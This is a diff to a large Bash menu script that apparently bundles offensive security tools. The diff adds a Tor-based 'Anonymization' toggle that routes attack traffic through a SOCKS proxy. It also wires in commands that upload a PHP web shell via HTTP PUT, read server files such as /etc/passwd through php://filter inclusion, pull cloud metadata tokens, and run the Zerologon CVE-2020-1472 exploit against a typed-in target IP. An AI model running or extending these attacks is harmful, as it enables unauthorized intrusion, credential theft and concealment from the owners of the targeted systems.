@@ -18,6 +18,8 @@ RLS="/releases"
 RLDW="$RLS""/download"
 WBE="For a better experience, please install "
 FMSG="press ENTER to continue..."
+CURLANON=""
+ANON="Disabled"
 
 function ScaricaIn
 {
@@ -178,10 +180,10 @@ function Clona
 	"4")
 		if [[ $(wget -q -S --spider "$ENTRAW""$1""/master/README.md" 2>&1) == *"200 OK"* ]];
 		then
-			curl "$ENTRAW""$1""/master/README.md" | less
+			curl -s -k -L "$ENTRAW""$1""/master/README.md" | less
 		elif [[ $(wget -q -S --spider "$ENTRAW""$1""/main/README.md" 2>&1) == *"200 OK"* ]];
 		then
-			curl "$ENTRAW""$1""/main/README.md" | less
+			curl -s -k -L "$ENTRAW""$1""/main/README.md" | less
 		else
 			echo "There is not any README.md file"
 		fi
@@ -193,13 +195,25 @@ function Clona
 
 function Scarica
 {
-	if [[ "$2" != "" ]];
+	if [[ "$ANON" == "Enabled" ]];
 	then
-		wget --no-check-certificate "$1" -O "$2"
-		chmod +x "./""$2"
+		if [[ "$2" != "" ]];
+		then
+			curl -s -k -L $CURLANON "$1" -o "$2"
+		else
+			QUESTO="./"$(echo "$1" | awk -F "/" '{print $NF}')
+			curl -s -k -L $CURLANON "$1" -o "$QUESTO"
+			chmod +x "$QUESTO"
+		fi
 	else
-		wget --no-check-certificate "$1"
-		chmod +x "./"$(echo "$1" | awk -F "/" '{print $NF}')
+		if [[ "$2" != "" ]];
+		then
+			wget --no-check-certificate "$1" -O "$2"
+			chmod +x "./""$2"
+		else
+			wget --no-check-certificate "$1"
+			chmod +x "./"$(echo "$1" | awk -F "/" '{print $NF}')
+		fi
 	fi
 }
 
@@ -282,8 +296,6 @@ then
 fi
 
 while true; do
-	echo "$SEP"
-	echo " 0. exit"
 	echo "$SEP"
 	echo "ACTIVE DIRECTORY"
 	Stampa " 27. Greenwolf/Spray" "229. DanMcInerney/icebreaker" "283. optiv/Talon"
@@ -458,7 +470,7 @@ while true; do
 	echo "CVE LIST"
 	Stampa " 2414. dirkjanm/CVE-2020-1472" "2421. twistlock/RunC-CVE-2019-5736" "2428. jas502n/CVE-2019-12384"
 	Stampa " 2488. shadowgatt/CVE-2019-19356" "2530. ButrintKomoni/cve-2020-0796" "2531. jiansiting/CVE-2020-0796"
-	Stampa " 2532. ZecOps/CVE-2020-0796-RCE-POC"
+	Stampa " 2532. ZecOps/CVE-2020-0796-RCE-POC" "2495. cube0x0/CVE-2021-1675"
 	echo "$SEP"
 	echo "D"
 	Stampa " 1090. dlang-community/D-Scanner"
@@ -876,7 +888,7 @@ while true; do
 	Stampa " 303. KTN1990/PostgreSQL--Attack-on-default-password-AUTOEXPLOITING-/DB"
 	echo "$SEP"
 	echo "PRINTER"
-	Stampa " 639. RUB-NDS/PRET" "2495. cube0x0/CVE-2021-1675"
+	Stampa " 639. RUB-NDS/PRET"
 	echo "$SEP"
 	echo "PRIVESC"
 	Stampa " 2394. swisskyrepo/PayloadsAllTheThings/Methodology_and_Resources/Linux-PrivilegeEscalation"
@@ -1137,6 +1149,7 @@ while true; do
 	Stampa " 2542. get ASN and infos of target IP from cymru.com" "2543. create an encrypted and encoded payload with metasploit" "2547. list all pulled docker images"
 	Stampa " 2548. run a docker image" "2549. docker process list" "2552. use nmap to scan ports for vulnerabilities"
 	Stampa " 2556. Execute remote command with rpcclient" "2557. disassemble binary with objdump" "2558. display all binary's headers with objdump"
+	Stampa " 2564. Anonymization"
 	echo "$SEP"
 	echo "VIRTUAL COINS - CURRENCIES"
 	Stampa " 511. Isaacdelly/Plutus" "512. dan-v/bruteforce-bitcoin-brainwallet" "513. SMH17/bitcoin-hacking-tools"
@@ -1231,10 +1244,13 @@ while true; do
 	Stampa " 1214. jeanphix/Ghost.py" "2471. sec-consult/aggrokatz" "1290. ZerBea/hcxtools"
 	Stampa " 1297. sharkdp/hexyl"
 	echo "$SEP"
+	echo -ne " 0. exit\tAnonymization: $ANON\n"
+	echo "$SEP"
 
 	read -p "Choose a script: " SCELTA
 	case "$SCELTA" in
 	"0")
+		QUESTO=""
 		PYPAK=""
 		RUPAK=""
 		ENTSSL=""
@@ -2383,7 +2399,7 @@ while true; do
 				read -p "(example, fetch 1:* (UID FLAGS INTERNALDATE ENVELOPE)): " IMAPREQ
 				if [[ "$IMAPREQ" != "" ]];
 				then
-					curl --url "$IMAPURL" --user "$EMAILADD" --request "$IMAPREQ"
+					curl $CURLANON --url "$IMAPURL" --user "$EMAILADD" --request "$IMAPREQ"
 				fi
 			fi
 		fi
@@ -3891,7 +3907,7 @@ while true; do
 			read -p "(example, ../../etc/passwd or ./index.php): " PAGE
 			if [[ "$PAGE" != "" ]];
 			then
-				curl "$URL""php://filter/convert.base64-encode/resource=""$PAGE"
+				curl $CURLANON "$URL""php://filter/convert.base64-encode/resource=""$PAGE"
 			fi
 		fi
 	;;
@@ -4042,7 +4058,7 @@ while true; do
 			read -e -p "(example, wsh3ll): " SHL
 			if [[ "$SHL" != "" ]];
 			then
-				curl -v -X PUT -d '<?php system($_GET["cmd"]);?>' "$URL""/""$SHL"".php"
+				curl $CURLANON -v -X PUT -d '<?php system($_GET["cmd"]);?>' "$URL""/""$SHL"".php"
 			fi
 		fi
 	;;
@@ -4311,7 +4327,7 @@ while true; do
 					TDP="$TTDP"
 				fi
 			fi
-			curl -s "$TIP"":""$TDP""/version" | python -m json.tool
+			curl $CURLANON -s "$TIP"":""$TDP""/version" | python -m json.tool
 		fi
 	;;
 	"653")
@@ -9919,7 +9935,21 @@ while true; do
 		Clona "anbud/DroidDucky"
 	;;
 	"2414")
-		Clona "dirkjanm/CVE-2020-1472"
+		if [[ ! -d "./CVE-2020-1472" ]];
+		then
+			Clona "dirkjanm/CVE-2020-1472"
+		fi
+		echo "Digit the Target IP"
+		read -p "(example, 192.168.1.12): " TIP
+		if [[ "$TIP" != "" ]];
+		then
+			echo "Digit the Target NetBIOS name"
+			read -p "(example, PC_WORKGROUP): " TDOM
+			if [[ "$TDOM" != "" ]];
+			then
+				./CVE-2020-1472/cve-2020-1472-exploit.py "$TDOM" "$TIP"
+			fi
+		fi
 	;;
 	"2415")
 		Scarica https://digi.ninja/files/bucket_finder_1.1.tar.bz2
@@ -9951,7 +9981,7 @@ while true; do
 		if [[ "$TIP" != "" ]];
 		then
 			export TOKEN=`curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" "$TIP/latest/api/token"`
-			curl -H "X-aws-ec2-metadata-token:$TOKEN" -v "$TIP/latest/meta-data"
+			curl $CURLANON -H "X-aws-ec2-metadata-token:$TOKEN" -v "$TIP/latest/meta-data"
 		fi
 	;;
 	"2424")
@@ -10633,6 +10663,32 @@ while true; do
 		if [[ $(Warning) == "Y" ]];
 		then
 			Clona "xadhrit/d9scan"
+		fi
+	;;
+	"2564")
+		if [[ "$ANON" == "Disabled" ]];
+		then
+			echo "Enabling Anonymization"
+			ANON="Enabled"
+			if [[ -f $(which systemctl) ]];
+			then
+				sudo systemctl start tor
+			elif [[ -f $(which sv) ]];
+			then
+				sv start tor
+			fi
+			CURLANON="--socks5 127.0.0.1:9050"
+		else
+			echo "Disabling Anonymization"
+			ANON="Disabled"
+			if [[ -f $(which systemctl) ]];
+			then
+				sudo systemctl stop tor
+			elif [[ -f $(which sv) ]];
+			then
+				sv stop tor
+			fi
+			CURLANON=""
 		fi
 	;;
 	*)
